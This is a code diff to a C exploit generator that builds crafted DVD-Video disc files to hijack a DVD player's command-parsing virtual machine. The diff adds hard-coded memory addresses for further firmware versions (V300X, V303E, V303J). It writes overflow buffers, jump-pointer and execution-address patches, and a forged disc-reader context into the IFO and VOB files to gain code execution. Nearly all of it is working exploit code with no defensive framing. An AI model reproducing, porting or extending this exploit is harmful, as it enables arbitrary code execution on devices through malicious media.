@@ -3,6 +3,13 @@
 #include <string.h>
 #include <stdlib.h>
 
+#define V300X ( \
+    defined(V300J) || \
+    defined(V300U) || \
+    defined(V300A) || \
+    defined(V300E) \
+)
+
 #define V302X ( \
     defined(V302J) || \
     defined(V302U) || \
@@ -12,6 +19,11 @@
     defined(V302G) || \
     defined(V302D) || \
     defined(V302C) \
+)
+
+#define V303X ( \
+    defined(V303J) || \
+    defined(V303E) \
 )
 
 #define MIN(x, y) ((x) > (y) ? (y) : (x))
@@ -193,20 +205,41 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define JUMP_POINTER 0x009111c0
 #define CMD_DATA_ADDR 0x013c9a30
 #define IFO_BUFFER 0x013cd280
+#elif V303E
+#define VM_CMD_PARSER_SWITCH_ADDR 0x00923d88
+#define VM_ADDR 0x015f4b00
+#define VOB_BUFFER_ADDR 0x015f94c0
+#define JUMP_POINTER 0x009292d0
+#define CMD_DATA_ADDR 0x015ec890
+#define DR_ADDR 0x015f4100
+#define IFO_BUFFER 0x015f0100
+#elif V303J
+#define VM_CMD_PARSER_SWITCH_ADDR 0x0069de88
+#define VM_ADDR 0x01199680
+#define VOB_BUFFER_ADDR 0x0119e040
+#define JUMP_POINTER 0x006a3348
+#define CMD_DATA_ADDR 0x01191410
+#define DR_ADDR 0x01198c80
+#define IFO_BUFFER 0x01194c80
 #endif
 
 #define CTRL_DATA_ADDR (VOB_BUFFER_ADDR + 0x0c + 0x629)
 #define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
 #define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
+#define EXEC_ADDR (CTRL_DATA_ADDR + 27)
+#define IFO_CMDT_PATCH_LOC 0x10FC
+#define IFO_PGC_CAT_PATCH_LOC 0x1008
+
 #if V302X
 #define INITIAL_COPY_BUF (IFO_BUFFER + 0x104)
-#else
+#elif V300X
 #define INITIAL_COPY_BUF (IFO_BUFFER + 0x18)
 #endif
 
+#if V300X || V302X
 #define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
-#define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
-#define EXEC_ADDR (CTRL_DATA_ADDR + 27)
+#endif
+
 #if V302X
 #define NEEDED_LEN_I2 ((INITIAL_COPY_BUF_TARGET - CMD_DATA_ADDR) + 24)
 #define INITIAL_COPY_BUF_TARGET_I2 (INITIAL_COPY_BUF + (NEEDED_LEN_I2 - 24))
@@ -215,14 +248,18 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define INITIAL_COPY_BUF_TARGET_I3 (INITIAL_COPY_BUF + (NEEDED_LEN_I3 - 24))
 
 #define VOB_PATCH_0_LOC 0x21b0
-#define IFO_CMDT_PATCH_LOC 0x10FC
-#define IFO_PGC_CAT_PATCH_LOC 0x1008
-#else
+#elif V300X
+#define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
 #define VOB_PATCH_0_LOC 0x629
+#elif V303X
+//#define VOB_PATCH_0_LOC ((IFO_CMDT_PATCH_LOC + 16 + (NEEDED_LEN - 24)) - 3828)
+#define VM_PATCH_LOC (IFO_CMDT_PATCH_LOC + 8 + (NEEDED_LEN - 24))
+#define DR_PATCH_LOC (IFO_CMDT_PATCH_LOC + 8 + (DR_ADDR - CMD_DATA_ADDR))
+#define BUFFER_END (IFO_BUFFER + 0x800*8)
+#define BUFFER_BAK (IFO_BUFFER + 0x0b19)
 #endif
 
 int main() {
-    printf("CMDT_SA: %x\n", CMDT_SA);
     printf("NEEDED_LEN: %x\n", NEEDED_LEN);
 
     uint8_t buf[24] = {
@@ -284,7 +321,7 @@ int main() {
         free(payload);
         return -1;
     }
-
+#if V300X || V302X
     fseek(fp, VOB_PATCH_0_LOC, SEEK_SET);
     if (fwrite(buf, 1, 24, fp) != 24) {
         fprintf(stderr, "Error: Failed to write buffer to VOB\n");
@@ -292,6 +329,7 @@ int main() {
         fclose(fp);
         return -1;
     }
+#endif
     fseek(fp, VOB_PATCH_1_LOC, SEEK_SET);
     if (fwrite(payload, 1, payload_len, fp) != payload_len) {
         fprintf(stderr, "Error: Failed to write payload to VOB\n");
@@ -301,16 +339,209 @@ int main() {
     }
     free(payload);
     fclose(fp);
-#if ( \
-    defined(V302J) || \
-    defined(V302U) || \
-    defined(V302A) || \
-    defined(V302E) || \
-    defined(V302K) || \
-    defined(V302G) || \
-    defined(V302D) || \
-    defined(V302C) \
-)
+#if V303X
+    fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
+    if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
+        return -1;
+    }
+    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
+    
+    if (fwrite("\x00\x01\x00\x00", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+    fclose(fp);
+
+    fp = fopen("./build/fs/VIDEO_TS/VTS_03_0.IFO", "rb+");
+    if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_03_0.IFO\n");
+        return -1;
+    }
+    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
+    
+    if (fwrite("\x00\x01\x00\x00", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fclose(fp);
+
+    uint32_t tmp = MAX(NEEDED_LEN / 8, 1);
+
+    uint8_t ifo_patch_buf[16] = {
+        (tmp >> 8) & 0xff, tmp & 0xff, // CMDT_PRE_CNT
+        0, 0, // CMDT_POST_CNT
+        0, 0, // CMDT_CELL_CNT
+        0, 15, // CMDT_EA
+        0, 48, 0, 0, 0, 0, 0, 0 // BROKEN_CMD
+    };
+
+    fp = fopen("./build/fs/VIDEO_TS/VTS_04_0.IFO", "rb+");
+    if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_04_0.IFO\n");
+        return -1;
+    }
+
+    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
+    
+    if (fwrite(ifo_patch_buf, 1, 16, fp) != 16) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, IFO_PGC_CAT_PATCH_LOC, SEEK_SET);
+
+    ifo_patch_buf[0] = (EXEC_ADDR >> 24) & 0xff;
+    ifo_patch_buf[1] = (EXEC_ADDR >> 16) & 0xff;
+    ifo_patch_buf[2] = (EXEC_ADDR >> 8) & 0xff;
+    ifo_patch_buf[3] = EXEC_ADDR & 0xff;
+    
+    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    // ifo end sector
+    fseek(fp, 0x1c, SEEK_SET);
+
+    ifo_patch_buf[0] = 0;
+    ifo_patch_buf[1] = 0;
+    ifo_patch_buf[2] = 0;
+    ifo_patch_buf[3] = 19;
+    
+    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+    
+    // vob start sector
+    fseek(fp, 0xc4, SEEK_SET);
+
+    ifo_patch_buf[0] = 0;
+    ifo_patch_buf[1] = 0;
+    ifo_patch_buf[2] = 0;
+    ifo_patch_buf[3] = 20;
+    
+    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    // bup end sector
+    fseek(fp, 0x0c, SEEK_SET);
+
+    ifo_patch_buf[0] = 0;
+    ifo_patch_buf[1] = 0;
+    ifo_patch_buf[2] = 0;
+    ifo_patch_buf[3] = 83;
+    
+    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, VM_PATCH_LOC, SEEK_SET);
+    if (fwrite(buf, 1, 24, fp) != 24) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    // restore the broken disc reader state
+
+    uint8_t data_reader_ctx[480]; // 428+4+16*3
+    memset(data_reader_ctx, 0, sizeof(data_reader_ctx));
+    // STATUS
+    data_reader_ctx[0] = 0;
+    data_reader_ctx[1] = 0;
+    data_reader_ctx[2] = 0;
+    data_reader_ctx[3] = 0;
+    // VTSN
+    data_reader_ctx[4] = 4;
+    data_reader_ctx[5] = 0;
+    data_reader_ctx[6] = 0;
+    data_reader_ctx[7] = 0;
+    // VTSN
+    data_reader_ctx[8] = 4;
+    data_reader_ctx[9] = 0;
+    data_reader_ctx[10] = 0;
+    data_reader_ctx[11] = 0;
+    // LBA
+    data_reader_ctx[12] = 16;
+    data_reader_ctx[13] = 0;
+    data_reader_ctx[14] = 0;
+    data_reader_ctx[15] = 0;
+    // SECTOR_CNT
+    data_reader_ctx[16] = 8;
+    data_reader_ctx[17] = 0;
+    data_reader_ctx[18] = 0;
+    data_reader_ctx[19] = 0;
+    // VIDEO_TS.IFO EA
+    data_reader_ctx[20] = 3;
+    data_reader_ctx[21] = 0;
+    data_reader_ctx[22] = 0;
+    data_reader_ctx[23] = 0;
+    // VTS_01_0.IFO EA
+    data_reader_ctx[24] = 5;
+    data_reader_ctx[25] = 0;
+    data_reader_ctx[26] = 0;
+    data_reader_ctx[27] = 0;
+    // VTS_02_0.IFO EA
+    data_reader_ctx[28] = 5;
+    data_reader_ctx[29] = 0;
+    data_reader_ctx[30] = 0;
+    data_reader_ctx[31] = 0;
+    // VTS_03_0.IFO EA
+    data_reader_ctx[32] = 5;
+    data_reader_ctx[33] = 0;
+    data_reader_ctx[34] = 0;
+    data_reader_ctx[35] = 0;
+    // VTS_04_0.IFO EA
+    data_reader_ctx[36] = 19;
+    data_reader_ctx[37] = 0;
+    data_reader_ctx[38] = 0;
+    data_reader_ctx[39] = 0;
+    // STM_PTR
+    data_reader_ctx[420] = BUFFER_BAK & 0xff;
+    data_reader_ctx[421] = (BUFFER_BAK >> 8) & 0xff;
+    data_reader_ctx[422] = (BUFFER_BAK >> 16) & 0xff;
+    data_reader_ctx[423] = (BUFFER_BAK >> 24) & 0xff;
+    // STM_EA
+    data_reader_ctx[424] = BUFFER_END & 0xff;
+    data_reader_ctx[425] = (BUFFER_END >> 8) & 0xff;
+    data_reader_ctx[426] = (BUFFER_END >> 16) & 0xff;
+    data_reader_ctx[427] = (BUFFER_END >> 24) & 0xff;
+
+    data_reader_ctx[452] = 0x01;
+    data_reader_ctx[459] = 0x02;
+    data_reader_ctx[472] = 0x18;
+    data_reader_ctx[476] = 0x2b;
+
+    fseek(fp, DR_PATCH_LOC, SEEK_SET);
+    if (fwrite(data_reader_ctx, 1, 480, fp) != 480) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    // expand file to 20 sectors
+    fseek(fp, 40959, SEEK_SET);
+    if (fwrite("\x00", 1, 1, fp) != 1) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fclose(fp);
+#elif V302X
     printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET);
     printf("NEEDED_LEN: %x\n", NEEDED_LEN_I2);
     printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET_I2);
@@ -395,7 +626,7 @@ int main() {
     }
 
     fclose(fp);
-#else
+#elif V300X
     if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
         fprintf(stderr, "Error: Failed to generate exploit PGC\n");
         return -1;
